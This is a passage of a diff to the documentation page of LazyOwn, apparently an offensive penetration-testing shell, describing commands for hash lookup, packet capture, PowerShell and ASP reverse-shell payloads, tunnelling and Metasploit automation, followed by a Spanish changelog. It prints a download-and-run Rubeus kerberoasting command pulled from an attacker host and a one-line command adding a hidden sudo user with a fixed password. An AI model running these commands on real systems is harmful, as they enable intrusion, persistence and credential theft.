+<p>The function also searches within the available commands in the cmd
+interface.</p>
+<h2 id="searchhash">searchhash</h2>
+<p>Helps to find hash types in Hashcat by searching through its help
+output.</p>
+<ol type="1">
+<li>Checks if an argument is provided:</li>
+</ol>
+<ul>
+<li>If no argument is given, displays an error message indicating the
+need to pass a hash type.</li>
+</ul>
+<ol start="2" type="1">
+<li>Executes a command to search for hash types:</li>
+</ol>
+<ul>
+<li>Runs <code>hashcat -h</code> to display Hashcat help information and
+pipes it to <code>grep</code> to search for the provided argument.</li>
+<li>Prints a message with the command being executed and provides
+further instructions for running Hashcat.</li>
+</ul>
+<ol start="3" type="1">
+<li>Prints a message suggesting the next step:</li>
+</ol>
+<ul>
+<li>Provides a suggestion for running Hashcat with the found hash
+types.</li>
+</ul>
+<p>:param line: The hash type or keyword to search for in the Hashcat
+help output. :type line: str :returns: None</p>
+<p>Manual execution: To manually run these tasks, you would need to: -
+Run <code>hashcat -h</code> to display the help information. - Use
+<code>grep</code> to search for the specific hash type or keyword within
+the help output. - Run Hashcat with the appropriate parameters based on
+the search results.</p>
+<p>Note: Ensure that <code>hashcat</code> is installed and accessible in
+the system’s PATH.</p>
+<h2 id="clean">clean</h2>
+<p>Deletes various files and directories related to the session
+cleanup.</p>
+<ol type="1">
+<li>Checks if the <code>rhost</code> parameter is valid:</li>
+</ol>
+<ul>
+<li>Uses the <code>check_rhost</code> function to verify if
+<code>rhost</code> is set and valid.</li>
+<li>If <code>rhost</code> is not valid, exits the function.</li>
+</ul>
+<ol start="2" type="1">
+<li>Executes a command to remove files and directories:</li>
+</ol>
+<ul>
+<li>Deletes specific files and directories within the
+<code>sessions</code> directory and other related locations.</li>
+<li>The command is executed using <code>os.system</code>.</li>
+</ul>
+<ol start="3" type="1">
+<li>Prints a message indicating that the cleanup is complete.</li>
+</ol>
+<p>:param line: This parameter is not used in the function. :type line:
+str :returns: None</p>
+<p>Manual execution: To manually run these tasks, you would need to: -
+Ensure that you have the correct <code>rhost</code> value set. -
+Manually execute the <code>rm</code> command to delete the specified
+files and directories.</p>
+<p>Note: This function performs a comprehensive cleanup by removing
+various files and directories associated with the current session and
+external resources.</p>
+<h2 id="pyautomate">pyautomate</h2>
+<p>Automates the execution of pwntomate tools on XML configuration
+files.</p>
+<ol type="1">
+<li>Sets the directory for XML files to be processed:</li>
+</ol>
+<ul>
+<li>Checks the <code>sessions</code> directory for XML files.</li>
+</ul>
+<ol start="2" type="1">
+<li>For each XML file found:</li>
+</ol>
+<ul>
+<li>Constructs and executes a command to run <code>pwntomate</code> with
+the XML file as input.</li>
+<li>The command is executed using <code>subprocess.run</code>, and
+errors are handled if the command fails.</li>
+</ul>
+<ol start="3" type="1">
+<li>After processing all XML files:</li>
+</ol>
+<ul>
+<li>Prints a message indicating that the target has been
+pwntomated.</li>
+</ul>
+<p>:param line: This parameter is not used in the function. :type line:
+str :returns: None</p>
+<p>Manual execution: To manually run these tasks, you would need to: -
+Ensure that XML configuration files are present in the
+<code>sessions</code> directory. - Run <code>pwntomate.py</code>
+manually on each XML file using a similar command format.</p>
+<p>Note: This function assumes that <code>pwntomate.py</code> is
+available in the current working directory and is executable with Python
+3.</p>
+<h2 id="alias">alias</h2>
+<p>Prints all configured aliases and their associated commands.</p>
+<ol type="1">
+<li>Retrieves the list of aliases from the <code>LazyOwnShell</code>
+instance:</li>
+</ol>
+<ul>
+<li>Iterates through each alias and its associated command.</li>
+</ul>
+<ol start="2" type="1">
+<li>For each alias:</li>
+</ol>
+<ul>
+<li>Displays the alias name and the full command it represents.</li>
+</ul>
+<p>:param line: This parameter is not used in the function. :type line:
+str :returns: None</p>
+<p>Manual execution: To manually run these tasks, you would need to: -
+Ensure that aliases are configured in the <code>LazyOwnShell</code>
+instance. - Manually review the aliases and their commands as
+displayed.</p>
+<p>Note: This function assumes that aliases are managed by the
+<code>LazyOwnShell</code> instance and are available for retrieval.</p>
+<h2 id="tcpdump_icmp">tcpdump_icmp</h2>
+<p>Starts <code>tcpdump</code> to capture ICMP traffic on the specified
+interface.</p>
+<ol type="1">
+<li>Checks if the <code>line</code> argument (interface) is
+provided:</li>
+</ol>
+<ul>
+<li>Displays an error message and exits if the interface is
+missing.</li>
+</ul>
+<ol start="2" type="1">
+<li>If the interface is provided:</li>
+</ol>
+<ul>
+<li>Displays the <code>tcpdump</code> command that will be
+executed.</li>
+<li>Runs the <code>tcpdump</code> command to capture ICMP traffic on the
+specified interface.</li>
+</ul>
+<p>:param line: The network interface on which to capture ICMP traffic
+(e.g., <code>tun0</code>). :type line: str :returns: None</p>
+<p>Manual execution: To manually run these tasks, you would need to: -
+Provide a valid network interface for capturing ICMP traffic. - Execute
+the <code>tcpdump</code> command manually to capture ICMP traffic on the
+specified interface.</p>
+<p>Note: Ensure that you have sufficient permissions to run
+<code>tcpdump</code> on the specified interface.</p>
+<h2 id="tcpdump_capture">tcpdump_capture</h2>
+<p>Starts packet capture using <code>tcpdump</code> on the specified
+interface.</p>
+<ol type="1">
+<li>Checks if the <code>line</code> argument (interface) is
+provided:</li>
+</ol>
+<ul>
+<li>Displays an error message and exits if the interface is
+missing.</li>
+</ul>
+<ol start="2" type="1">
+<li>Validates the <code>rhost</code> (remote host IP):</li>
+</ol>
+<ul>
+<li>Exits the function if the <code>rhost</code> is not valid.</li>
+</ul>
+<ol start="3" type="1">
+<li>If the interface and <code>rhost</code> are valid:</li>
+</ol>
+<ul>
+<li>Displays the <code>tcpdump</code> command that will be
+executed.</li>
+<li>Runs the <code>tcpdump</code> command to capture packets on the
+specified interface and save the capture file to
+<code>pcaps/capture_&lt;rhost&gt;.pcap</code>.</li>
+</ul>
+<p>:param line: The network interface on which to capture packets (e.g.,
+<code>tun0</code>). :type line: str :returns: None</p>
+<p>Manual execution: To manually run these tasks, you would need to: -
+Provide a valid network interface for capturing packets. - Ensure the
+remote host IP is set correctly. - Execute the <code>tcpdump</code>
+command manually to capture packets on the specified interface.</p>
+<p>Note: Ensure that the <code>pcaps</code> directory exists and is
+writable for saving the capture file.</p>
+<h2 id="tshark_analyze">tshark_analyze</h2>
+<p>Analyzes a packet capture file using <code>tshark</code> based on the
+provided remote host IP.</p>
+<ol type="1">
+<li>Checks if the <code>rhost</code> (remote host IP) is valid:</li>
+</ol>
+<ul>
+<li>Displays an error message and exits if the <code>rhost</code> is not
+valid.</li>
+</ul>
+<ol start="2" type="1">
+<li>Verifies the existence of the packet capture file:</li>
+</ol>
+<ul>
+<li>Displays an error message and exits if the capture file is
+missing.</li>
+<li>Prompts the user to run the <code>do_tcpdump_capture</code> command
+first.</li>
+</ul>
+<ol start="3" type="1">
+<li>If the capture file exists:</li>
+</ol>
+<ul>
+<li>Displays the <code>tshark</code> command that will be executed.</li>
+<li>Runs the <code>tshark</code> command to analyze the packet capture
+file and print out IP destination and frame time fields.</li>
+</ul>
+<p>:param line: The command line input specifying the interface for
+capturing packets. :type line: str :returns: None</p>
+<p>Manual execution: To manually run these tasks, you would need to: -
+Ensure the remote host IP is valid. - Run the
+<code>do_tcpdump_capture</code> command to capture packets. - Execute
+the <code>tshark</code> command manually to analyze the packet capture
+file.</p>
+<p>Note: Ensure that the capture file
+<code>pcaps/capture_&lt;rhost&gt;.pcap</code> is available in the
+<code>pcaps</code> directory.</p>
+<h2 id="rdp">rdp</h2>
+<p>Reads credentials from a file, encrypts the password, and executes
+the RDP connection command.</p>
+<ol type="1">
+<li>Reads credentials:
+<ul>
+<li>Reads the username and password from the
+<code>sessions/credentials.txt</code> file.</li>
+</ul></li>
+<li>Encrypts the password:
+<ul>
+<li>Uses <code>remmina --encrypt-password</code> to encrypt the password
+obtained from the file.</li>
+</ul></li>
+<li>Executes the RDP connection command:
+<ul>
+<li>Uses the encrypted password to construct and execute the
+<code>remmina -c</code> command to initiate the RDP connection.</li>
+</ul></li>
+</ol>
+<p>:param line: This function does not use any arguments. :type line:
+str :returns: None</p>
+<p>Manual execution: To manually execute the command: - Ensure
+<code>sessions/credentials.txt</code> contains the credentials in the
+format <code>username:password</code>. - Run the <code>rdp</code>
+command to read the credentials, encrypt the password, and connect to
+the RDP server. Example usage: <code>rdp</code></p>
+<h2 id="base64encode">base64encode</h2>
+<p>Encodes a given string into Base64 format.</p>
+<ol type="1">
+<li>Encodes the input string:
+<ul>
+<li>Uses the <code>base64</code> library to encode the provided string
+into Base64 format.</li>
+</ul></li>
+<li>Displays the encoded string:
+<ul>
+<li>Prints the Base64 encoded string to the terminal.</li>
+</ul></li>
+</ol>
+<p>:param line: The string to encode in Base64 format. :type line: str
+:returns: None</p>
+<p>Manual execution: To manually encode a string in Base64: - Provide
+the string to the command and it will print the Base64 encoded result.
+Example usage: <code>base64encode HelloWorld</code></p>
+<h2 id="base64decode">base64decode</h2>
+<p>Decodes a Base64 encoded string.</p>
+<ol type="1">
+<li>Decodes the Base64 string:
+<ul>
+<li>Uses the <code>base64</code> library to decode the provided Base64
+encoded string back to its original form.</li>
+</ul></li>
+<li>Displays the decoded string:
+<ul>
+<li>Prints the decoded string to the terminal.</li>
+</ul></li>
+</ol>
+<p>:param line: The Base64 encoded string to decode. :type line: str
+:returns: None</p>
+<p>Manual execution: To manually decode a Base64 encoded string: -
+Provide the Base64 encoded string to the command and it will print the
+decoded result. Example usage:
+<code>base64decode SGVsbG9Xb3JsZA==</code></p>
+<h2 id="grisun0">grisun0</h2>
+<p>Creates and copies a shell command to add a new user
+<code>grisun0</code>, set a password, add the user to the sudo group,
+and switch to the user.</p>
+<ol type="1">
+<li>Displays the command:
+<ul>
+<li>Prints the command to add the user <code>grisun0</code> with home
+directory <code>/home/.grisun0</code>, set the password, add the user to
+the <code>sudo</code> group, set the appropriate permissions, and switch
+to the user.</li>
+</ul></li>
+<li>Copies the command to clipboard:
+<ul>
+<li>Uses <code>xclip</code> to copy the command to the clipboard for
+easy pasting.</li>
+</ul></li>
+</ol>
+<p>:param line: This function does not use any arguments. :type line:
+str :returns: None</p>
+<p>Manual execution: To manually execute the command: - Copy the command
+from the clipboard. - Run it in a terminal to create the user and set up
+the permissions as specified. useradd -m -d /home/.grisun0 -s /bin/bash
+grisun0 &amp;&amp; echo ‘grisun0:grisgrisgris’ | chpasswd &amp;&amp;
+usermod -aG sudo grisun0 &amp;&amp; chmod 700 /home/.grisun0 &amp;&amp;
+su - grisun0 Note: Ensure <code>xclip</code> is installed and available
+on your system.</p>
+<h2 id="winbase64payload">winbase64payload</h2>
+<p>Creates a base64 encoded PowerShell payload specifically for Windows
+to execute a <code>.ps1</code> script from <code>lhost</code>.</p>
+<ol type="1">
+<li>Checks if <code>lhost</code> is set:
+<ul>
+<li>Displays an error message and exits if <code>lhost</code> is not
+set.</li>
+</ul></li>
+<li>Checks if a file name is provided:
+<ul>
+<li>Displays an error message and exits if no file name is
+provided.</li>
+</ul></li>
+<li>Constructs a PowerShell command:
+<ul>
+<li>The command downloads and executes a <code>.ps1</code> script from
+<code>lhost</code> using <code>New-Object WebClient</code>.</li>
+</ul></li>
+<li>Encodes the PowerShell command:
+<ul>
+<li>Converts the command to UTF-16LE encoding.</li>
+<li>Encodes the UTF-16LE encoded command to base64.</li>
+<li>Copies the final base64 command to the clipboard using
+<code>xclip</code>.</li>
+</ul></li>
+</ol>
+<p>:param line: The name of the <code>.ps1</code> file located in the
+<code>sessions</code> directory. :type line: str :returns: None</p>
+<p>Manual execution: To manually use the payload: - Ensure
+<code>lhost</code> is set to the correct IP address. - Place the
+<code>.ps1</code> file in the <code>sessions</code> directory. - Use
+<code>xclip</code> to copy the generated base64 command to the
+clipboard.</p>
+<p>Note: Ensure <code>iconv</code>, <code>base64</code>, and
+<code>xclip</code> are installed and available on your system.</p>
+<h2 id="revwin">revwin</h2>
+<p>Creates a base64 encoded PowerShell reverse shell payload
+specifically for Windows to execute a <code>.ps1</code> script from
+<code>lhost</code>.</p>
+<ol type="1">
+<li>Checks if <code>lhost</code> and <code>lport</code> are set and
+valid:
+<ul>
+<li>Uses <code>check_lhost(lhost)</code> to verify the
+<code>lhost</code> parameter.</li>
+<li>Uses <code>check_lport(lport)</code> to verify the
+<code>lport</code> parameter.</li>
+<li>Exits the function if either <code>lhost</code> or
+<code>lport</code> is invalid.</li>
+</ul></li>
+<li>Constructs a PowerShell reverse shell command with the following
+structure:
+<ul>
+<li>Connects to the specified <code>lhost</code> and <code>lport</code>
+using <code>TCPClient</code>.</li>
+<li>Reads data from the TCP stream, executes it, and sends back the
+results.</li>
+<li>Appends the current path to the response for interactive use.</li>
+</ul></li>
+<li>Encodes the PowerShell command:
+<ul>
+<li>Encodes the command in UTF-16LE.</li>
+<li>Converts the UTF-16LE encoded command to base64.</li>
+<li>Creates a PowerShell command that executes the base64 encoded
+payload.</li>
+</ul></li>
+<li>Copies the final PowerShell command to the clipboard:
+<ul>
+<li>Uses <code>xclip</code> to copy the command to the clipboard.</li>
+</ul></li>
+</ol>
+<p>:param line: This parameter is not used in the function but is
+present for consistency with the method signature. :type line: str
+:returns: None</p>
+<p>Manual execution: To manually use the payload: - Ensure
+<code>lhost</code> and <code>lport</code> are correctly set. - Use
+<code>xclip</code> to copy the generated PowerShell command to the
+clipboard.</p>
+<p>Note: Ensure <code>xclip</code> is installed and available on your
 system.</p>
-<p>This function uses the <code>parse_proc_net_file</code> function to
-extract open TCP and UDP ports from the corresponding /proc/net files.
-It returns two lists: one for TCP ports and one for UDP ports.</p>
-<p>:return: A tuple containing two lists: the first list with open TCP
-ports and the second list with open UDP ports. :rtype: tuple of (list of
-tuple, list of tuple)</p>
-<h2 id="find_credentials">find_credentials</h2>
-<p>Searches for potential credentials in files within the specified
-directory.</p>
-<p>This function uses a regular expression to find possible credentials
-such as passwords, secrets, API keys, and tokens in files within the
-given directory. It iterates through all files in the directory and
-prints any matches found.</p>
-<p>:param directory: The directory to search for files containing
-credentials. :type directory: str :return: None</p>
-<h2 id="rotate_char">rotate_char</h2>
-<p>Internal function to rotate characters for ROT cipher.</p>
-<p>This function takes a character and a shift value, and rotates the
-character by the specified shift amount. It only affects alphabetical
-characters, leaving non-alphabetical characters unchanged.</p>
-<p>:param c: The character to be rotated. :type c: str :param shift: The
-number of positions to shift the character. :type shift: int :return:
-The rotated character. :rtype: str</p>
-<h2 id="get_network_info">get_network_info</h2>
-<p>Retrieves network interface information with their associated IP
-addresses.</p>
-<p>This function executes a shell command to gather network interface
-details, parses the output to extract interface names and their
-corresponding IP addresses, and returns this information in a dictionary
-format. The dictionary keys are interface names, and the values are IP
-addresses.</p>
-<p>:return: A dictionary where the keys are network interface names and
-the values are their associated IP addresses. :rtype: dict</p>
-<h2 id="getprompt">getprompt</h2>
-<p>Generate a command prompt string with network information and user
-status.</p>
-<p>:param: None</p>
-<p>:returns: A string representing the command prompt with network
-information and user status.</p>
-<p>Manual execution: To manually get a prompt string with network
-information and user status, ensure you have
-<code>get_network_info()</code> implemented to return a dictionary of
-network interfaces and their IPs. Then use the function to create a
-prompt string based on the current user and network info.</p>
-<p>Example: If the function <code>get_network_info()</code> returns: {
-‘tun0’: ‘10.0.0.1’, ‘eth0’: ‘192.168.1.2’ }</p>
-<p>And the user is root, the prompt string generated might be:
-[LazyOwn👽10.0.0.1]# If the user is not root, it would be:
-[LazyOwn👽10.0.0.1]$</p>
-<p>If no ‘tun’ interface is found, the function will use the first
-available IP or fallback to ‘127.0.0.1’.</p>
-<h2 id="copy2clip">copy2clip</h2>
-<p>Copia el texto proporcionado al portapapeles usando xclip.</p>
-<p>Args: text (str): El texto que se desea copiar al portapapeles.</p>
-<p>Example: copy2clip(“Hello, World!”)</p>
-<h2 id="wrapper">wrapper</h2>
-<p>internal wrapper of internal function to implement multiples rhost to
-operate.</p>
+<h2 id="asprevbase64">asprevbase64</h2>
+<p>Creates a base64 encoded ASP reverse shell payload and copies it to
+the clipboard.</p>
+<ol type="1">
+<li>Checks if a base64 encoded payload is provided:
+<ul>
+<li>If no payload is provided, displays an error message and exits the
+function.</li>
+</ul></li>
+<li>If a payload is provided:
+<ul>
+<li>Creates an ASP script that uses <code>WScript.Shell</code> to
+execute a PowerShell command encoded in base64.</li>
+<li>The created ASP script writes the result of the PowerShell command
+to the response output.</li>
+<li>Uses <code>xclip</code> to copy the ASP script to the clipboard with
+the provided base64 encoded payload.</li>
+</ul></li>
+</ol>
+<p>:param line: The base64 encoded payload to be used in the ASP reverse
+shell. :type line: str :returns: None</p>
+<p>Manual execution: To manually create the ASP payload: - Ensure you
+have the base64 encoded payload ready. - Use <code>xclip</code> to copy
+the provided command to the clipboard.</p>
+<p>Note: Ensure <code>xclip</code> is installed and available on your
+system. For help on creating the base64 encoded payload, see
+<code>help winbase64payload</code>.</p>
+<h2 id="rubeus">rubeus</h2>
+<p>Copies a command to the clipboard for downloading and running
+Rubeus.</p>
+<ol type="1">
+<li>Checks if <code>lhost</code> (local host IP) is set:
+<ul>
+<li>If <code>lhost</code> is not set, displays an error message and
+exits the function.</li>
+</ul></li>
+<li>If <code>lhost</code> is set:
+<ul>
+<li>Displays a message indicating that the Rubeus downloader command has
+been copied to the clipboard.</li>
+<li>The copied command downloads Rubeus from the specified
+<code>lhost</code> and saves it as <code>Rubeus.exe</code>.</li>
+<li>Uses <code>xclip</code> to copy the following command to the
+clipboard:</li>
+<li><code>iwr -uri http://{lhost}/Rubeus.exe -OutFile Rubeus.exe ; .\Rubeus.exe kerberoast /creduser:domain.local\usuario /credpassword:password</code></li>
+</ul></li>
+</ol>
+<p>:param line: Not used in this function. :type line: str :returns:
+None</p>
+<p>Manual execution: To manually run these tasks, you would need to: -
+Ensure that <code>lhost</code> is set correctly. - Use
+<code>xclip</code> to copy the provided command to the clipboard. -
+Execute the downloaded Rubeus executable with the provided
+arguments.</p>
+<p>Note: Ensure <code>xclip</code> is installed and available on your
+system.</p>
+<h2 id="socat">socat</h2>
+<p>Sets up and runs a <code>socat</code> tunnel with SOCKS4A proxy
+support.</p>
+<ol type="1">
+<li><p>If no <code>line</code> (IP:port) argument is provided:</p>
+<ul>
+<li>Displays an error message indicating the need to pass
+<code>ip:port</code>.</li>
+<li>Exits the function.</li>
+</ul></li>
+<li><p>Displays a message instructing the user to configure
+<code>socks5</code> at <code>127.0.0.1:1080</code> in
+<code>/etc/proxychains.conf</code>.</p></li>
+<li><p>If a valid <code>line</code> argument is provided:</p>
+<ul>
+<li>Displays the command being run:
+<code>socat TCP-LISTEN:1080,fork SOCKS4A:localhost:{line},socksport=1080</code>.</li>
+<li>Executes the <code>socat</code> command to listen on port 1080 and
+forward traffic to the specified IP and port using SOCKS4A proxy.</li>
+<li>Prints a shutdown message for the <code>socat</code> tunnel at port
+1080.</li>
+</ul></li>
+</ol>
+<p>:param line: The IP and port (formatted as <code>ip:port</code>) to
+forward traffic to through the SOCKS4A proxy. :type line: str :returns:
+None</p>
+<p>Manual execution: To manually run these tasks, you would need to: -
+Configure the <code>socks5</code> proxy settings in
+<code>/etc/proxychains.conf</code>. - Use the <code>socat</code> command
+with appropriate IP and port.</p>
+<p>Note: Ensure that <code>socat</code> is installed and properly
+configured on your system.</p>
+<h2 id="chisel">chisel</h2>
+<p>Automates the setup and execution of Chisel server and client for
+tunneling and port forwarding.</p>
+<ol type="1">
+<li>If no <code>lhost</code> (local host IP) is set:
+<ul>
+<li>Displays an error message indicating the need to set
+<code>lhost</code> using the <code>set</code> command.</li>
+<li>Exits the function.</li>
+</ul></li>
+<li>If no port argument is provided:
+<ul>
+<li>Displays an error message indicating the need to provide a port
+number.</li>
+<li>Exits the function.</li>
+</ul></li>
+<li>If required Chisel files are not present:
+<ul>
+<li>Displays an error message prompting the user to run the
+<code>download_resources</code> command.</li>
+<li>Exits the function.</li>
+</ul></li>
+<li>If a valid port is provided:
+<ul>
+<li>Displays usage instructions for the Linux and Windows payloads.</li>
+<li>Constructs and copies the appropriate Chisel command to the
+clipboard based on user choice (1 for Windows, 2 for Linux).</li>
+<li>Extracts and sets up Chisel binaries for Linux and Windows from
+compressed files.</li>
+<li>Runs the Chisel server on the specified port and prints a shutdown
+message.</li>
+</ul></li>
+</ol>
+<p>:param line: The command line input containing the port number for
+Chisel setup. :type line: str :returns: None</p>
+<p>Manual execution: To manually run these tasks, you would need to: -
+Ensure <code>lhost</code> is set using
+<code>set lhost &lt;IP&gt;</code>. - Provide the port number when
+calling the function. - Run the command <code>download_resources</code>
+if the Chisel files are missing. - Manually execute the Chisel commands
+for Linux or Windows as copied to the clipboard.</p>
+<p>Note: Ensure that all required files
+(<code>chisel_1.9.1_linux_amd64.gz</code> and
+<code>chisel_1.9.1_windows_amd64.gz</code>) are available in the
+<code>sessions</code> directory.</p>
+<h2 id="msf">msf</h2>
+<p>Automates various Metasploit tasks including scanning for
+vulnerabilities, setting up reverse shells, and creating payloads.</p>
+<ol type="1">
+<li>If no arguments are provided:
+<ul>
+<li>Retrieves the target IP (<code>rhost</code>) from parameters.</li>
+<li>Checks if the IP is valid using <code>check_rhost()</code>. If
+invalid, exits the function.</li>
+<li>Creates a Metasploit resource script
+(<code>/tmp/scan_vulnerabilities.rc</code>) that includes commands for
+scanning ports, enumerating services, and checking for known
+vulnerabilities.</li>
+<li>Executes Metasploit with the created resource script and then
+deletes the temporary file.</li>
+<li>Prints a shutdown message after running the scan.</li>
+</ul></li>
+<li>If the argument starts with “rev”:
+<ul>
+<li>Sets up a reverse shell payload based on the specified platform and
+user choice (with or without meterpreter).</li>
+<li>Creates a Metasploit resource script (<code>/tmp/handler.rc</code>)
+for handling incoming reverse shell connections.</li>
+<li>Executes Metasploit with the created resource script and then
+deletes the temporary file.</li>
+<li>Prints a shutdown message after setting up the handler.</li>
+</ul></li>
+<li>If the argument starts with “lnk”:
+<ul>
+<li>Configures parameters (<code>lhost</code>, <code>lport</code>) for
+creating a payload.</li>
+<li>Uses <code>msfvenom</code> to generate a payload executable and
+saves it in the <code>sessions</code> directory.</li>
+<li>Creates an XML file (<code>download_payload.xml</code>) that will be
+used to download and execute the payload on a target machine.</li>
+<li>Creates a PowerShell script (<code>create_lnk.ps1</code>) to
+generate a shortcut file (<code>.lnk</code>) pointing to the
+payload.</li>
+<li>Prints instructions and generates a command to copy to the clipboard
+for setting up the payload and files.</li>
+</ul></li>
+<li>If the argument starts with “autoroute”:
+<ul>
+<li>Configures parameters for setting up a Metasploit session and
+autorouting.</li>
+<li>Creates a Metasploit resource script
+(<code>/tmp/autoroute.rc</code>) to handle exploit sessions and set up
+autorouting.</li>
+<li>Executes Metasploit with the resource script and starts a SOCKS
+proxy for routing traffic.</li>
+<li>Configures proxychains to use the Metasploit SOCKS proxy and prints
+instructions for using proxychains with tools.</li>
+</ul></li>
+</ol>
+<p>:param line: The command line input that determines which Metasploit
+task to automate. :type line: str :returns: None</p>
+<p>Manual execution: To manually run these tasks, you would need to: -
+For scanning: Create and run the resource script using
+<code>msfconsole -r /tmp/scan_vulnerabilities.rc</code>. - For reverse
+shells: Configure and run the resource script with the appropriate
+payload settings. - For payload generation and shortcuts: Use
+<code>msfvenom</code> and create XML and PowerShell scripts as
+specified. - For autorouting: Create and run the resource script for
+autorouting and configure proxychains.</p>
+<p>Note: Ensure all required parameters (<code>lhost</code>,
+<code>lport</code>, etc.) are set before running these tasks.</p>
+<h2 id="encrypt">encrypt</h2>
+<p>Encrypts a file using XOR encryption.</p>
+<ol type="1">
+<li>Splits the provided <code>line</code> into <code>file_path</code>
+and <code>key</code> arguments.</li>
+<li>Checks if the correct number of arguments (2) is provided; if not,
+prints an error message and returns.</li>
+<li>Reads the file specified by <code>file_path</code>.</li>
+<li>Encrypts the file contents using the
+<code>xor_encrypt_decrypt</code> function with the provided
+<code>key</code>.</li>
+<li>Writes the encrypted data to a new file with the “.enc” extension
+added to the original file name.</li>
+<li>Prints a message indicating the file has been encrypted.</li>
+<li>Catches and handles the <code>FileNotFoundError</code> exception if
+the specified file does not exist, and prints an error message.</li>
+</ol>
+<p>:param line: A string containing the file path and the key separated
+by a space. :type line: str :returns: None</p>
+<p>Manual execution: To manually run this command, use the following
+syntax: encrypt <file_path> <key> Replace <code>&lt;file_path&gt;</code>
+with the path to the file to be encrypted and <code>&lt;key&gt;</code>
+with the encryption key.</p>
+<h2 id="decrypt">decrypt</h2>
+<p>Decrypts a file using XOR encryption.</p>
+<ol type="1">
+<li>Splits the provided <code>line</code> into <code>file_path</code>
+and <code>key</code> arguments.</li>
+<li>Checks if the correct number of arguments (2) is provided; if not,
+prints an error message and returns.</li>
+<li>Reads the encrypted file specified by <code>file_path</code>.</li>
+<li>Decrypts the file contents using the
+<code>xor_encrypt_decrypt</code> function with the provided
+<code>key</code>.</li>
+<li>Writes the decrypted data to a new file by removing the “.enc”
+extension from the original file name.</li>
+<li>Prints a message indicating the file has been decrypted.</li>
+<li>Catches and handles the <code>FileNotFoundError</code> exception if
+the specified file does not exist, and prints an error message.</li>
+</ol>
+<p>:param line: A string containing the file path and the key separated
+by a space. :type line: str :returns: None</p>
+<p>Manual execution: To manually run this command, use the following
+syntax: decrypt <file_path> <key> Replace <code>&lt;file_path&gt;</code>
+with the path to the encrypted file and <code>&lt;key&gt;</code> with
+the decryption key.</p>
+<h2 id="get_output">get_output</h2>
+<p>Devuelve la salida acumulada</p>
+<h2 id="double_base64_encode">double_base64_encode</h2>
+<p>No description available.</p>
+<h2 id="apply_obfuscations">apply_obfuscations</h2>
+<p>No description available.</p>
+<!-- END COMMANDS -->
+<!-- START CHANGELOG -->
 <h1 id="changelog">Changelog</h1>
+<h3 id="pruebas">Pruebas</h3>
+<ul>
+<li>test(test): testing changelog Version: release/0.0.13 LazyOwn on
+HackTheBox: https://app.hackthebox.com/teams/overview/6429 LazyOwn/
+https://grisuno.github.io/LazyOwn/ Fecha: Wed Aug 14 17:03:41 2024 -0400
+Hora: 1723669421</li>
+</ul>
+<h3 id="pruebas-1">Pruebas</h3>
+<ul>
+<li>test(testing): new changelog format Version: release/0.0.13 new
+template LazyOwn on HackTheBox:
+https://app.hackthebox.com/teams/overview/6429 LazyOwn/
+https://grisuno.github.io/LazyOwn/ Fecha: Wed Aug 14 16:56:07 2024 -0400
+Hora: 1723668967</li>
+</ul>
+<h3 id="pruebas-2">Pruebas</h3>
+<ul>
+<li>test(test): Version: release/0.0.13 test LazyOwn on HackTheBox:
+https://app.hackthebox.com/teams/overview/6429 LazyOwn/
+https://grisuno.github.io/LazyOwn/ Fecha: Wed Aug 14 16:55:32 2024 -0400
+Hora: 1723668932</li>
+</ul>
+<h3 id="pruebas-3">Pruebas</h3>
+<ul>
+<li>test(testeando): nuevo changelog Version: release/0.0.13 mejor
+formateado LazyOwn on HackTheBox:
+https://app.hackthebox.com/teams/overview/6429 LazyOwn/
+https://grisuno.github.io/LazyOwn/ Fecha: Wed Aug 14 16:47:49 2024 -0400
+Hora: 1723668469</li>
+</ul>
+<h3 id="pruebas-4">Pruebas</h3>
+<ul>
+<li>test(test): deploy Version: release/0.0.13 changes in changelog
+LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429
+LazyOwn/ https://grisuno.github.io/LazyOwn/ Fecha: Wed Aug 14 16:35:12
+2024 -0400 Hora: 1723667712</li>
+</ul>
+<h3 id="pruebas-5">Pruebas</h3>
+<ul>
+<li>test(testing): changelog Version: release/0.0.13 saltos de linea
+LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429
+LazyOwn/ https://grisuno.github.io/LazyOwn/ Fecha: Wed Aug 14 16:34:08
+2024 -0400 Hora: 1723667648</li>
+</ul>
+<h3 id="pruebas-6">Pruebas</h3>
+<ul>
+<li>test(tesing): saltos de linea en commit Version: release/0.0.13 :)
+LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429
+LazyOwn/ https://grisuno.github.io/LazyOwn/ Fecha: Wed Aug 14 16:28:47
+2024 -0400 Hora: 1723667327</li>
+</ul>
+<h3 id="documentación">Documentación</h3>
+<ul>
+<li>docs(class=“neon-text” on ul): :): release/0.0.13:)LazyOwn on
+HackTheBox: https://app.hackthebox.com/teams/overview/6429 LazyOwn/
+https://grisuno.github.io/LazyOwn/ : Wed Aug 14 15:57:39 2024 -0400 -
+Hora: 1723665459</li>
+</ul>
+<h3 id="pruebas-7">Pruebas</h3>
+<ul>
+<li>test(commits con fecha y hora :P): probando el despliegue:
+release/0.0.13fechasLazyOwn on HackTheBox:
+https://app.hackthebox.com/teams/overview/6429 LazyOwn/
+https://grisuno.github.io/LazyOwn/ : Wed Aug 14 15:52:12 2024 -0400 -
+Hora: 1723665132</li>
+</ul>
+<h3 id="pruebas-8">Pruebas</h3>
+<ul>
+<li>test(test de index.html): testeando el despliegue automatizado del
+sitio web de LazyOwn: release/0.0.13://grisuno.github.io/LazyOwn/LazyOwn
+on HackTheBox: https://app.hackthebox.com/teams/overview/6429 LazyOwn/
+https://grisuno.github.io/LazyOwn/</li>
+</ul>
+<h3 id="pruebas-9">Pruebas</h3>
+<ul>
+<li>test(test index.sh): se realizan cambios en index.sh:
+release/0.0.13cambios realizan cambios en index.html con un nuevo
+sistema de plantillasLazyOwn on HackTheBox:
+https://app.hackthebox.com/teams/overview/6429 LazyOwn/
+https://grisuno.github.io/LazyOwn/</li>
+</ul>
+<h3 id="pruebas-10">Pruebas</h3>
+<ul>
+<li>test(testing): Testeando el flujo de trabajo en los despliegues
+automatizados.: release/0.0.13el nuevi versionamientoLazyOwn on
+HackTheBox: https://app.hackthebox.com/teams/overview/6429 LazyOwn/
+https://grisuno.github.io/LazyOwn/</li>
+</ul>
+<h3 id="nuevas-características">Nuevas características</h3>
+<ul>
+<li>feature(versionamiento semantico en script de deploy): mejora en
+DEPLOY.sh con versionamiento semantico: release/0.1.0vrsionamiento
+semantico en el script de depsliegueLazyOwn on HackTheBox:
+https://app.hackthebox.com/teams/overview/6429 LazyOwn/
